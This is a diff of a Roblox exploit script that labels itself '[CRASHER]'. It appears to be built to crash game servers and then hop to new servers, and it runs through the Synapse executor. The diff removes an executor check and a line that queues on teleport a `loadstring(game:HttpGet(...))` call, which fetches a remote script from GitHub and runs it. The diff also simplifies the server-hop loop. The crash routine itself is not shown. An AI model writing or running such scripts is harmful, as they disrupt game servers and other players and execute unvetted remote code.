@@ -1,9 +1,6 @@
 repeat
 	wait()
 until game:IsLoaded()
-if not syn or not syn.queue_on_teleport then
-	warn("[CRASHER] Unsupported exploit.")
-end
 game:GetService("StarterGui"):SetCore("SendNotification",{
 				Icon = "rbxthumb://type=Asset&id=5895361327&w=150&h=150",
 				Title = "          CRASHING",
@@ -97,12 +94,6 @@ end)()
 local Dir = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
 Dir.DescendantAdded:Connect(function(Err)
 	if Err.Name == "ErrorTitle" then
-	    if not queued then
-	        queued = true
-	        syn.queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/iShield2005/scripts/master/mcy-serverswitch-crash"))()')
-	    end
-	    while wait(15) do
-		    serverHop()
-		end
+		serverHop()
 	end
 end)
